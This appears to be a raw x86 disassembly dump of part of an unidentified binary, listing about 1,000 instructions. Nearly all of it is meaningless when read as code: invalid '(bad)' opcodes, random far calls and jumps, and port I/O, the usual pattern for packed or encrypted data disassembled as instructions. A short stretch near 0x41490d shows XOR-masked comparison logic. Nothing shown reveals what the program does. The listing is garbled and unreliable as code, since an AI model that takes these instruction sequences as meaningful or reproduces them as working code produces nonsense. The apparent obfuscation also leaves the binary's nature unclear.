  414481:	adc    edx,esp
  414483:	sti    
  414484:	scas   eax,DWORD PTR es:[edi]
  414485:	icebp  
  414486:	shl    BYTE PTR [eax],0x39
  414489:	mov    al,0x1d
  41448b:	mov    DWORD PTR [eax-0x46],eax
  41448e:	das    
  41448f:	enter  0x828,0x2c
  414493:	in     al,dx
  414494:	adc    cl,BYTE PTR [edi-0x710b77ea]
  41449a:	sbb    BYTE PTR ss:[edx-0x68],0xa7
  41449f:	dec    ebx
  4144a0:	jnp    0x4144de
  4144a2:	and    eax,0xe0b88fbb
  4144a7:	pop    ds
  4144a8:	in     al,0x11
  4144aa:	(bad)  
  4144ab:	xor    eax,DWORD PTR [ecx]
  4144ad:	push   ecx
  4144ae:	or     al,0x22
  4144b0:	cmp    eax,0xfa6b678a
  4144b5:	and    BYTE PTR [ebp+0x6e],0x4
  4144b9:	or     DWORD PTR [ecx-0x343dca7b],edx
  4144bf:	es jg  0x4144c9
  4144c2:	das    
  4144c3:	(bad)  
  4144c4:	and    esi,esi
  4144c6:	stos   DWORD PTR es:[edi],eax
  4144c7:	leave  
  4144c8:	cmp    dl,bh
  4144ca:	xchg   ebx,eax
  4144cb:	out    dx,eax
  4144cc:	xlat   BYTE PTR ds:[ebx]
  4144cd:	ja     0x414488
  4144cf:	jge    0x4144a2
  4144d1:	fdiv   QWORD PTR [edi+0x30b5f0a1]
  4144d7:	jae    0x4144f5
  4144d9:	and    DWORD PTR [ecx],ebx
  4144db:	add    al,0xf3
  4144dd:	cmp    BYTE PTR [ebx+eiz*1],dh
  4144e0:	lods   al,BYTE PTR ds:[esi]
  4144e1:	je     0x414483
  4144e3:	lods   al,BYTE PTR ds:[esi]
  4144e4:	pop    es
  4144e5:	push   edi
  4144e6:	fisttp WORD PTR [ecx-0x23ef81ad]
  4144ec:	add    al,0x91
  4144ee:	ds sahf 
  4144f0:	xlat   BYTE PTR ds:[ebx]
  4144f1:	jmp    0xf6d1f15
  4144f6:	jo     0x4144e9
  4144f8:	push   0xb42c0377
  4144fd:	ficom  DWORD PTR [edx]
  4144ff:	ins    BYTE PTR es:[edi],dx
  414500:	loope  0x41455a
  414502:	mov    edx,0xfaefe39e
  414508:	sub    BYTE PTR [eax-0x1c],0x57
  41450c:	xor    al,0x46
  41450e:	sub    ah,BYTE PTR [eax+edx*1-0x17a9c98c]
  414515:	sar    BYTE PTR [edi+esi*2+0x7d134462],cl
  41451c:	inc    ebx
  41451d:	push   edi
  41451e:	loop   0x41456f
  414520:	push   0x15
  414522:	rol    DWORD PTR [ebx],0x87
  414525:	lds    eax,FWORD PTR [edi]
  414527:	mov    al,0x9a
  414529:	pusha  
  41452a:	push   edx
  41452b:	mov    ds:0x8de2ce5a,eax
  414530:	sar    ebp,0x8b
  414533:	cmp    edi,DWORD PTR [ebp+0x5b7f5c47]
  414539:	in     al,0x92
  41453b:	jg     0x4144e9
  41453d:	xor    al,0xf3
  41453f:	add    DWORD PTR [edi],eax
  414541:	mov    ebp,0x2de5bca5
  414546:	xchg   ecx,eax
  414547:	and    BYTE PTR [edx+eax*1],ah
  41454a:	ds (bad) 
  41454d:	and    dl,al
  41454f:	adc    bl,BYTE PTR [eax-0x7c75e426]
  414555:	xchg   esp,eax
  414556:	mov    DWORD PTR [edi-0xbb06b69],esp
  41455c:	cmp    edx,DWORD PTR ds:[edi+0x43c32094]
  414563:	cmp    cl,BYTE PTR [eax-0x13]
  414566:	scas   al,BYTE PTR es:[edi]
  414567:	loopne 0x4145bc
  414569:	test   esp,edx
  41456b:	xor    ah,BYTE PTR [eax]
  41456d:	scas   eax,DWORD PTR es:[edi]
  41456e:	pop    eax
  41456f:	dec    edi
  414570:	mov    ebp,0xb0c66f3
  414575:	movmskps edx,xmm5
  414578:	loopne 0x4145a0
  41457a:	cmp    DWORD PTR [edi],eax
  41457c:	xchg   esi,eax
  41457d:	and    ah,0x51
  414580:	pop    esi
  414581:	and    DWORD PTR [ebp-0x3c],esp
  414584:	inc    esi
  414585:	pop    edx
  414586:	push   ss
  414587:	pop    ebx
  414588:	cmp    al,0xeb
  41458a:	adc    al,ch
  41458c:	or     al,0x27
  41458e:	loope  0x414518
  414590:	or     dh,dl
  414592:	mov    ah,BYTE PTR [ecx]
  414594:	push   ebx
  414595:	sbb    DWORD PTR [ecx+0x2b],edi
  414598:	pop    ebx
  414599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41459a:	push   esp
  41459b:	nop
  41459c:	or     ch,BYTE PTR [edi-0x4]
  41459f:	lods   eax,DWORD PTR ds:[esi]
  4145a0:	sub    cl,BYTE PTR [edi]
  4145a2:	and    BYTE PTR [ebx-0x29],0x8f
  4145a6:	nop
  4145a7:	leave  
  4145a8:	scas   al,BYTE PTR es:[edi]
  4145a9:	in     eax,dx
  4145aa:	js     0x4145ee
  4145ac:	nop
  4145ad:	mov    fs,esp
  4145af:	sub    eax,0x9fe6d517
  4145b4:	mov    eax,ds:0x650e006c
  4145b9:	push   ecx
  4145ba:	adc    ebp,DWORD PTR [esi]
  4145bc:	jne    0x4145fd
  4145be:	inc    ebp
  4145bf:	repz pop ecx
  4145c1:	(bad)  
  4145c2:	(bad)  
  4145c3:	repnz retf 0xda14
  4145c7:	test   BYTE PTR [edx],0xf6
  4145ca:	xor    BYTE PTR [edi],ch
  4145cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145cd:	in     al,dx
  4145ce:	into   
  4145cf:	dec    ecx
  4145d0:	popa   
  4145d1:	lock inc ecx
  4145d3:	cmc    
  4145d4:	inc    edi
  4145d5:	shr    DWORD PTR [edx+0x6b5ef9e9],0x36
  4145dc:	scas   eax,DWORD PTR es:[edi]
  4145dd:	(bad)  
  4145de:	cmp    eax,0xbecd0733
  4145e3:	(bad)  
  4145e4:	retf   0x3d04
  4145e7:	das    
  4145e8:	popf   
  4145e9:	cmp    BYTE PTR [eax+0x4a],al
  4145ec:	and    ecx,DWORD PTR [edi-0x7a]
  4145ef:	add    BYTE PTR [esp+ebx*1+0x3],ah
  4145f3:	and    BYTE PTR [edx-0x74b0141c],0x2b
  4145fa:	not    BYTE PTR [esi-0x663c2048]
  414600:	xor    eax,0x386ee86
  414605:	fdiv   st,st(3)
  414607:	test   eax,0x35140624
  41460c:	addr16 loope 0x414606
  41460f:	ss in  eax,dx
  414611:	mov    esp,0x79336929
  414616:	leave  
  414617:	add    BYTE PTR ds:0xeb2d09e8,ch
  41461d:	mov    WORD PTR [edx-0x26],fs
  414620:	sahf   
  414621:	test   al,0x6b
  414623:	add    eax,0x7b8ec735
  414628:	fisttp DWORD PTR [eiz*1-0x7519fd52]
  41462f:	xchg   ebx,eax
  414630:	sub    bh,BYTE PTR [esi-0x73285a13]
  414636:	popf   
  414637:	imul   edi
  414639:	mov    ecx,0xd414bd49
  41463e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41463f:	clc    
  414640:	scas   eax,DWORD PTR es:[edi]
  414641:	mov    edx,0xd295491e
  414646:	imul   ebx,DWORD PTR [ecx],0x36
  414649:	int    0x48
  41464b:	mul    DWORD PTR [edx+ecx*1-0xc]
  41464f:	mov    ebx,0xfdba9a28
  414654:	cmp    ebp,esi
  414656:	mov    eax,edx
  414658:	cmp    eax,0x628661
  41465d:	into   
  41465e:	sbb    ebx,DWORD PTR [edx-0x1b]
  414661:	push   edx
  414662:	jle    0x4145fd
  414664:	shl    bh,1
  414666:	mov    esi,0xb3615185
  41466b:	std    
  41466c:	pop    edx
  41466d:	das    
  41466e:	ins    BYTE PTR es:[edi],dx
  41466f:	or     al,BYTE PTR [ecx+0x18ecf1ba]
  414675:	lahf   
  414676:	gs cwde 
  414678:	enter  0xbe,0x55
  41467c:	popa   
  41467d:	in     al,dx
  41467e:	mov    edi,0x782e4be
  414683:	imul   edx,DWORD PTR [edi-0x61eb2ff5],0x5e7365ef
  41468d:	nop
  41468e:	pop    esp
  41468f:	cmp    ebp,DWORD PTR [esi]
  414691:	outs   dx,DWORD PTR ds:[esi]
  414692:	xlat   BYTE PTR ds:[ebx]
  414693:	call   0x2c39f3fd
  414698:	adc    BYTE PTR [edi],dl
  41469a:	iret   
  41469b:	mov    edi,DWORD PTR [ecx+edx*2+0x65f619bf]
  4146a2:	pop    edi
  4146a3:	sub    ebp,DWORD PTR [ecx-0x2b3b90fe]
  4146a9:	fidiv  DWORD PTR [edx-0x16]
  4146ac:	cwde   
  4146ad:	loop   0x4146a8
  4146af:	cmc    
  4146b0:	inc    edi
  4146b1:	mov    bh,0x10
  4146b3:	fwait
  4146b4:	jp     0x4146da
  4146b6:	adc    eax,0xaf6cb125
  4146bb:	lods   eax,DWORD PTR ds:[esi]
  4146bc:	fist   WORD PTR [esi*2+0x2964378]
  4146c3:	adc    DWORD PTR [eax+0x6f03fbbb],ecx
  4146c9:	stos   DWORD PTR es:[edi],eax
  4146ca:	aaa    
  4146cb:	jmp    0x414714
  4146cd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4146cf:	or     ebx,DWORD PTR [edi-0x60]
  4146d2:	mov    ebx,0xcb555609
  4146d7:	mul    BYTE PTR [edx-0x77]
  4146da:	dec    ebp
  4146db:	sar    bh,0x1
  4146de:	fwait
  4146df:	and    cl,bh
  4146e1:	xchg   esp,eax
  4146e2:	add    BYTE PTR [edx],dl
  4146e4:	xor    eax,0xfd46ce47
  4146e9:	outs   dx,BYTE PTR ds:[esi]
  4146eb:	dec    edi
  4146ec:	and    dl,BYTE PTR [ecx-0x40158275]
  4146f2:	test   al,0x1e
  4146f4:	rol    DWORD PTR [edx-0x5a],1
  4146f7:	cmp    DWORD PTR [eax],esp
  4146f9:	xor    eax,0xe2fcd56
  4146fe:	sub    al,0x23
  414700:	mov    al,0xc9
  414702:	xor    edx,DWORD PTR ds:0xa32f3a32
  414708:	call   0x6b8f2204
  41470d:	xchg   esp,eax
  41470e:	push   esi
  41470f:	addr16 in eax,0x1f
  414712:	push   ss
  414713:	call   0x7c5d4b58
  414718:	das    
  414719:	shl    BYTE PTR [esp+ebp*4+0x3749e0e9],0x58
  414721:	push   edi
  414722:	fild   QWORD PTR [eax-0x58]
  414725:	dec    esp
  414726:	inc    esi
  414727:	cmp    BYTE PTR [ebp+0x79],bh
  41472a:	test   eax,0x489ddfec
  41472f:	stc    
  414730:	call   0xd9ec5b3a
  414735:	sub    eax,0x6ff17ebd
  41473a:	dec    edi
  41473b:	in     al,dx
  41473c:	lock sbb BYTE PTR [eax],cl
  41473f:	je     0x4146ef
  414741:	mov    eax,0xb703c08a
  414746:	add    ebp,edi
  414748:	xchg   ebp,eax
  414749:	xor    cl,BYTE PTR [ecx-0x35]
  41474c:	popa   
  41474d:	adc    ah,bl
  41474f:	je     0x4147a7
  414751:	stos   DWORD PTR es:[edi],eax
  414752:	pop    ecx
  414753:	cmp    al,0x3c
  414755:	jns    0x4147b7
  414757:	aam    0x4f
  414759:	adc    DWORD PTR [edx],ebx
  41475b:	pop    esp
  41475c:	sahf   
  41475d:	ficom  DWORD PTR [eax]
  414760:	mov    bl,0xd0
  414762:	int3   
  414763:	mov    ah,al
  414765:	stc    
  414766:	pushf  
  414767:	push   edi
  414768:	dec    ebp
  414769:	inc    esp
  41476a:	xor    DWORD PTR [ecx],edx
  41476c:	neg    BYTE PTR [edi]
  41476e:	sub    BYTE PTR [ebp+0x70],ah
  414771:	jg     0x4147db
  414773:	lock inc BYTE PTR [esi]
  414776:	outs   dx,DWORD PTR ds:[esi]
  414777:	fild   QWORD PTR [ecx]
  414779:	retf   0xfaf3
  41477c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41477d:	fs iretw 
  414780:	add    eax,0x223385b6
  414785:	pop    ss
  414786:	loope  0x414784
  414788:	test   al,0xdf
  41478a:	mov    edi,0xff1cd50c
  41478f:	sub    eax,0xf9accdc2
  414794:	mov    ch,0x5c
  414796:	or     esi,DWORD PTR [edx+eax*8+0x41]
  41479a:	push   ebx
  41479b:	sahf   
  41479c:	adc    dh,BYTE PTR [edx-0x6fc87f5f]
  4147a2:	in     al,dx
  4147a3:	xor    BYTE PTR [esi+0x7e4a40ff],0x5a
  4147aa:	jg     0x414748
  4147ac:	enter  0x6fa3,0x65
  4147b0:	test   DWORD PTR [edx-0x7a59b132],edi
  4147b6:	xchg   esi,eax
  4147b7:	push   esi
  4147b8:	and    BYTE PTR [eax],dh
  4147ba:	and    al,0x3d
  4147bc:	jmp    DWORD PTR [eax+0x19]
  4147bf:	ret    0x3c31
  4147c2:	xor    eax,0xcd4097df
  4147c7:	stos   DWORD PTR es:[edi],eax
  4147c8:	test   al,0x12
  4147ca:	inc    edx
  4147cb:	mov    edi,0xc56e9947
  4147d0:	and    esi,edi
  4147d2:	push   edi
  4147d3:	xor    ebp,ecx
  4147d5:	mov    esp,0xd6c3de1e
  4147da:	push   ebx
  4147db:	push   ebp
  4147dc:	shl    BYTE PTR [esi-0x37],cl
  4147df:	xor    al,BYTE PTR [ecx-0x6d]
  4147e2:	leave  
  4147e3:	mov    cl,0x47
  4147e5:	dec    BYTE PTR [edx-0xc]
  4147e8:	dec    ecx
  4147e9:	leave  
  4147ea:	loope  0x414815
  4147ec:	inc    esp
  4147ed:	sar    DWORD PTR [ebx-0xa7404ed],cl
  4147f3:	arpl   WORD PTR [ecx],bx
  4147f5:	das    
  4147f6:	inc    edx
  4147f7:	or     al,0x5a
  4147f9:	in     eax,0xd7
  4147fb:	xor    eax,0xd24914d4
  414800:	jge    0x41486a
  414802:	or     al,0xde
  414804:	pop    ss
  414805:	repnz aam 0xaa
  414808:	daa    
  414809:	es or  eax,0x6214524c
  41480f:	or     al,0xb1
  414811:	push   eax
  414812:	imul   esi,DWORD PTR [esi+0x7b],0x6b
  414816:	jmp    0x414875
  414818:	xor    ah,BYTE PTR [ebp+0x32]
  41481b:	mov    eax,ds:0x27748156
  414820:	dec    eax
  414821:	lods   al,BYTE PTR ds:[esi]
  414822:	nop
  414823:	and    esp,0xffffffb8
  414826:	mov    dh,0x53
  414828:	outs   dx,BYTE PTR ds:[esi]
  414829:	mov    DWORD PTR gs:[ebx-0x57d6a1b6],ecx
  414830:	jbe    0x4147d3
  414832:	cmc    
  414833:	or     eax,DWORD PTR [ebx+0x6]
  414836:	imul   ebx,DWORD PTR [ebp-0x5a],0xc97ff6a5
  41483d:	imul   ebx,ebp,0xffffffd5
  414840:	push   0x28c58e84
  414845:	test   cl,ch
  414847:	dec    ebp
  414848:	sub    bh,BYTE PTR ds:0x9caa052d
  41484e:	(bad)  [ecx]
  414850:	lods   eax,DWORD PTR ds:[esi]
  414851:	sbb    eax,0x39dea79c
  414856:	inc    esp
  414857:	pop    edx
  414858:	cs xor edx,0x816a1589
  41485f:	pop    esi
  414860:	leave  
  414861:	repz xor esp,eax
  414864:	cmp    esi,esi
  414866:	stos   BYTE PTR es:[edi],al
  414867:	mov    BYTE PTR [edi],dh
  414869:	ret    0x6948
  41486c:	bound  edx,QWORD PTR [edi+0x4a]
  41486f:	retf   
  414870:	jae    0x414855
  414872:	inc    ecx
  414873:	leave  
  414874:	rcl    ah,0x3e
  414877:	sahf   
  414878:	into   
  414879:	fxam   
  41487b:	in     al,0xcf
  41487d:	jp     0x41482f
  41487f:	call   FWORD PTR [ebp+0xa1e8f7d]
  414885:	xor    BYTE PTR [eax-0x2d6ba0f2],ah
  41488b:	pop    edi
  41488c:	sar    BYTE PTR ds:0x1e838bcd,1
  414892:	pop    esi
  414893:	nop
  414894:	mov    edi,0x4f2ef259
  414899:	lock mov esp,0x99e5ef2e
  41489f:	retf   0x1e11
  4148a2:	arpl   WORD PTR [esi+eiz*2+0x2c3b43a5],si
  4148a9:	pop    esp
  4148aa:	mov    al,ds:0xfd3169a2
  4148af:	mov    esi,0xfccd77f2
  4148b4:	adc    al,0xa9
  4148b6:	mov    ecx,0xe060cb62
  4148bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148bc:	repz lea ebx,[edi-0x10]
  4148c0:	add    DWORD PTR [ecx],esp
  4148c2:	pop    ebp
  4148c3:	into   
  4148c4:	fidivr WORD PTR [eax+0x55795440]
  4148ca:	fild   DWORD PTR [ecx]
  4148cc:	lods   al,BYTE PTR ds:[esi]
  4148cd:	les    esp,FWORD PTR [ecx+0x4abb8189]
  4148d3:	jne    0x4148ee
  4148d5:	call   0x4a57:0x92f1232a
  4148dc:	inc    DWORD PTR [ebp-0x72]
  4148df:	pop    ecx
  4148e0:	pop    esp
  4148e1:	retf   
  4148e2:	add    eax,0xb31df51e
  4148e7:	xchg   ebp,eax
  4148e8:	in     eax,dx
  4148e9:	add    DWORD PTR [ebp+0xbd3cab2],esp
  4148ef:	rol    DWORD PTR [ebp-0x34],0x30
  4148f3:	mov    DWORD PTR [eax+0x523c3b3],edx
  4148f9:	sub    al,0x6c
  4148fb:	sub    bh,BYTE PTR [ebp-0x42]
  4148fe:	nop
  4148ff:	stos   BYTE PTR es:[edi],al
  414900:	pop    ds
  414901:	pusha  
  414902:	pop    esi
  414903:	inc    eax
  414904:	push   0x659a3626
  414909:	xchg   edi,eax
  41490a:	pop    ds
  41490b:	int    0x26
  41490d:	sbb    BYTE PTR [esi-0x4d],0x8b
  414911:	push   ebp
  414912:	hlt    
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    cl,BYTE PTR [eax-0x33]
  414991:	pop    ecx
  414992:	add    al,0x4e
  414994:	xchg   esp,eax
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	daa    
  41499c:	inc    ebx
  41499d:	rol    DWORD PTR [edx-0x2f],cl
  4149a0:	loopne 0x414923
  4149a2:	sbb    ebx,ecx
  4149a4:	xchg   ecx,eax
  4149a5:	sbb    DWORD PTR [edi],ecx
  4149a7:	push   0x98527ffa
  4149ac:	adc    eax,0x9377e39
  4149b1:	repz xor al,bl
  4149b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b5:	int3   
  4149b6:	mov    DWORD PTR [ebx-0x6b],edi
  4149b9:	aam    0x1f
  4149bb:	mov    cl,0x34
  4149bd:	mov    al,ds:0xd0a29e4c
  4149c2:	jmp    0xe57800b5
  4149c7:	out    0xc7,eax
  4149c9:	sub    ah,BYTE PTR [ecx]
  4149cb:	fcmove st,st(6)
  4149cd:	fs mov dh,0x7f
  4149d0:	cdq    
  4149d1:	loop   0x4149e4
  4149d3:	nop
  4149d4:	jno    0x414969
  4149d6:	fidiv  WORD PTR [esi+0x60]
  4149d9:	or     cl,bl
  4149db:	sub    al,0xe1
  4149dd:	xor    eax,0x3b7d7f7f
  4149e2:	jo     0x4149d1
  4149e4:	test   BYTE PTR [ebx-0x4e],bh
  4149e7:	dec    ebx
  4149e8:	repz fisub DWORD PTR [ecx+eax*4]
  4149ec:	xor    eax,0x5dfda52c
  4149f1:	in     eax,0xcc
  4149f3:	in     eax,dx
  4149f4:	sbb    BYTE PTR [edx],0x6
  4149f7:	imul   ecx,DWORD PTR ds:0x62685b9f,0xf500c93d
  414a01:	mov    bh,0xa8
  414a03:	xlat   BYTE PTR ds:[ebx]
  414a04:	pushf  
  414a05:	push   0x56c4a307
  414a0a:	hlt    
  414a0b:	adc    DWORD PTR [edx-0x6032e746],esp
  414a11:	push   ebx
  414a12:	jae    0x4149df
  414a14:	stos   DWORD PTR es:[edi],eax
  414a15:	(bad)  
  414a16:	out    dx,eax
  414a17:	xor    dh,BYTE PTR [edi+0x4df9628e]
  414a1d:	push   edi
  414a1e:	jmp    0x4149c9
  414a20:	mov    eax,0xa8280207
  414a25:	jle    0x4149c9
  414a27:	mov    BYTE PTR [edi-0x7b],bl
  414a2a:	push   es
  414a2b:	xor    eax,0x35922171
  414a30:	hlt    
  414a31:	cmp    esi,DWORD PTR ds:[ebx-0x7e]
  414a35:	mov    ch,0x14
  414a37:	jno    0x414a3e
  414a39:	mov    esp,0xfe341679
  414a3e:	gs dec edi
  414a40:	ror    DWORD PTR [ebp-0xb],cl
  414a43:	out    0xc7,al
  414a45:	mov    edx,DWORD PTR [ebp+esi*8-0xbe70e08]
  414a4c:	imul   eax,ebp,0x9bfb125f
  414a52:	mov    ebp,0x5b5c1056
  414a57:	cmc    
  414a58:	stos   DWORD PTR es:[edi],eax
  414a59:	gs gs pop esi
  414a5c:	xor    al,0x79
  414a5e:	and    DWORD PTR [esi+esi*2-0x66],ebx
  414a62:	xor    bl,0xf9
  414a65:	push   esp
  414a66:	jg     0x414a28
  414a68:	jne    0x414ace
  414a6a:	ficomp WORD PTR [ebp-0x62]
  414a6d:	sti    
  414a6e:	rcl    eax,1
  414a70:	std    
  414a71:	sar    BYTE PTR [esi-0x5b6b927a],1
  414a77:	in     eax,0x26
  414a79:	jo     0x414a9f
  414a7b:	into   
  414a7c:	push   esp
  414a7d:	xor    eax,0xda056934
  414a82:	dec    esp
  414a83:	iret   
  414a84:	out    dx,eax
  414a85:	inc    esp
  414a86:	cmp    DWORD PTR [edx+0x4f],eax
  414a89:	test   cl,cl
  414a8b:	dec    bp
  414a8d:	mov    ah,bl
  414a8f:	stos   DWORD PTR es:[edi],eax
  414a90:	sbb    al,0x0
  414a92:	imul   ecx
  414a94:	or     al,0xe0
  414a97:	test   al,0xc5
  414a99:	xchg   dh,bl
  414a9b:	outs   dx,BYTE PTR ds:[esi]
  414a9c:	xchg   esp,eax
  414a9d:	cmp    esp,edx
  414a9f:	add    al,0x51
  414aa1:	popa   
  414aa2:	ffree  st(4)
  414aa4:	das    
  414aa5:	and    BYTE PTR [edx-0x52],bh
  414aa8:	jb     0x414a5c
  414aaa:	xchg   esp,eax
  414aab:	fcmovnb st,st(2)
  414aad:	cmp    bh,cl
  414aaf:	xchg   DWORD PTR [edx+0x3a412194],ebp
  414ab5:	jnp    0x414a6b
  414ab7:	test   DWORD PTR [edi-0xa],0x39a64bd7
  414abe:	ficom  DWORD PTR [edx-0x77495c8]
  414ac4:	arpl   WORD PTR [ecx-0x1d6ecf40],ax
  414aca:	adc    BYTE PTR [edi],bl
  414acc:	test   al,0x9
  414ace:	jge    0x414ac2
  414ad0:	mov    ch,0xbd
  414ad2:	or     al,0x0
  414ad4:	inc    ebx
  414ad5:	gs or  eax,0x5976f9ea
  414adb:	rol    dl,cl
  414add:	mov    ds:0x810cca93,eax
  414ae2:	idiv   BYTE PTR [eax+0x57fe1b8b]
  414ae8:	jb     0x414aa3
  414aea:	cli    
  414aeb:	xor    bl,BYTE PTR [edi+eiz*1+0x75]
  414aef:	pop    ds
  414af0:	hlt    
  414af1:	add    al,bh
  414af3:	idiv   ebx
  414af5:	test   eax,0xe14b8724
  414afa:	lock mov bh,0x3f
  414afd:	push   esi
  414afe:	aaa    
  414aff:	sbb    al,0xa4
  414b01:	inc    ebx
  414b02:	and    eax,0xaff96ac0
  414b07:	stos   BYTE PTR es:[edi],al
  414b08:	xchg   edi,eax
  414b09:	sbb    BYTE PTR [ebp-0x515bb954],al
  414b0f:	mov    ebx,0xfb9764ed
  414b14:	push   es
  414b15:	ins    BYTE PTR es:[edi],dx
  414b16:	repnz jecxz 0x414b4f
  414b19:	sub    eax,0x52f969a7
  414b1e:	repz adc eax,0xc94fbdf8
  414b24:	ficom  WORD PTR [esi+eiz*2-0x6638e54e]
  414b2b:	leave  
  414b2c:	xor    ah,BYTE PTR [esi+0x2e]
  414b2f:	test   edx,ebp
  414b31:	adc    eax,0x9587e380
  414b36:	aas    
  414b37:	(bad)  
  414b38:	sbb    bh,ah
  414b3a:	cmp    DWORD PTR [ecx+0x66a722d0],ebp
  414b40:	ins    DWORD PTR es:[edi],dx
  414b41:	push   ss
  414b42:	and    BYTE PTR [edx],cl
  414b44:	jp     0x414b1b
  414b46:	out    0xa0,eax
  414b48:	iret   
  414b49:	jae    0x414bb6
  414b4b:	adc    DWORD PTR [edx],eax
  414b4d:	test   al,0x7d
  414b4f:	xchg   ebp,eax
  414b50:	jae    0x414b04
  414b52:	dec    esp
  414b53:	sbb    ebx,DWORD PTR [ebx+edx*8-0x2b]
  414b57:	inc    edx
  414b58:	jbe    0x414b4f
  414b5a:	ins    DWORD PTR es:[edi],dx
  414b5b:	mov    dl,0x43
  414b5d:	add    al,BYTE PTR [eax-0x6ba1f5be]
  414b63:	jp     0x414b43
  414b65:	xor    BYTE PTR [esi+ecx*8+0x48287056],al
  414b6c:	test   BYTE PTR [eax-0x68],ch
  414b6f:	sub    al,0x80
  414b71:	(bad)  
  414b72:	jmp    0x414b8c
  414b74:	pop    ss
  414b75:	nop
  414b76:	inc    ebp
  414b77:	je     0x414b03
  414b79:	clc    
  414b7a:	sbb    eax,DWORD PTR [esi-0x66202eb5]
  414b80:	cli    
  414b81:	inc    ebx
  414b82:	pop    ds
  414b83:	inc    ebp
  414b84:	mov    edx,0x86676507
  414b89:	shr    BYTE PTR [edx],1
  414b8b:	fwait
  414b8c:	and    DWORD PTR [edx],edx
  414b8e:	int    0x65
  414b90:	sub    al,BYTE PTR [eax+0x53]
  414b93:	mov    fs,WORD PTR [edx-0xb]
  414b96:	push   0xffffff9b
  414b98:	xchg   esi,eax
  414b99:	push   esp
  414b9a:	mov    cl,0x73
  414b9c:	mov    eax,0xc3d2d37d
  414ba1:	adc    BYTE PTR [eax+0x289e876e],0xb8
  414ba8:	push   ds
  414ba9:	cmc    
  414baa:	adc    al,0x2d
  414bac:	xchg   ecx,eax
  414bad:	loopne 0x414b89
  414baf:	sbb    al,0xfa
  414bb1:	lds    esp,FWORD PTR [edi+edx*4-0x65]
  414bb5:	ins    DWORD PTR es:[edi],dx
  414bb6:	mov    ds:0xcc157c76,eax
  414bbb:	stos   BYTE PTR es:[edi],al
  414bbc:	nop
  414bbd:	std    
  414bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bbf:	mov    dl,0xa1
  414bc1:	mov    DWORD PTR [edi+0x5a],edi
  414bc4:	mov    ds:0x2a9f2140,eax
  414bc9:	outs   dx,DWORD PTR ds:[esi]
  414bca:	pop    eax
  414bcb:	mov    al,ds:0x6a0db817
  414bd0:	dec    eax
  414bd1:	out    0x69,al
  414bd3:	pop    edx
  414bd4:	outs   dx,DWORD PTR ds:[esi]
  414bd5:	inc    edi
  414bd6:	leave  
  414bd7:	fsubr  st(4),st
  414bd9:	fldenv [ebx-0x4b37744d]
  414bdf:	ret    0xed28
  414be2:	adc    ecx,DWORD PTR [ecx-0x70372cb]
  414be8:	lahf   
  414be9:	test   DWORD PTR [ecx+0x38eb61aa],ecx
  414bef:	mov    al,0xad
  414bf1:	mov    ecx,0xdf5094f0
  414bf6:	xor    eax,0x207f4803
  414bfb:	js     0x414bc0
  414bfd:	pop    ds
  414bfe:	mov    bl,0x7d
  414c00:	aad    0x22
  414c02:	jne    0x414bae
  414c04:	psubd  mm6,mm5
  414c07:	sub    DWORD PTR [edi-0x7ef9fe0],0xffffffdc
  414c0e:	lahf   
  414c0f:	dec    edx
  414c10:	mov    ebp,0x462ebd31
  414c15:	push   eax
  414c16:	or     DWORD PTR [edx-0xae4a3bd],edi
  414c1c:	jb     0x414bbf
  414c1e:	xchg   esp,eax
  414c1f:	xlat   BYTE PTR ds:[ebx]
  414c20:	ins    DWORD PTR es:[edi],dx
  414c21:	xchg   esi,eax
  414c22:	out    0xdd,al
  414c24:	mov    ss,ebp
  414c26:	mov    al,0xf4
  414c28:	rcl    DWORD PTR ds:0x23e8d23d,cl
  414c2e:	(bad)  [esi]
  414c30:	aas    
  414c31:	sbb    ebp,DWORD PTR [eax]
  414c33:	test   al,0x69
  414c35:	xor    dh,dh
  414c37:	mov    eax,ds:0x9f8cc6ef
  414c3c:	inc    ebp
  414c3d:	(bad)  
  414c3e:	in     al,dx
  414c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c40:	arpl   WORD PTR [eax+0x50f75900],ax
  414c46:	div    BYTE PTR [ecx+0x52f377e8]
  414c4c:	ds xchg edx,eax
  414c4e:	jns    0x414c97
  414c50:	fistp  WORD PTR [ebx]
  414c52:	ss lahf 
  414c54:	adc    ebx,edx
  414c56:	mov    esi,0x4bcdf9e3
  414c5b:	test   eax,0x6e6c9006
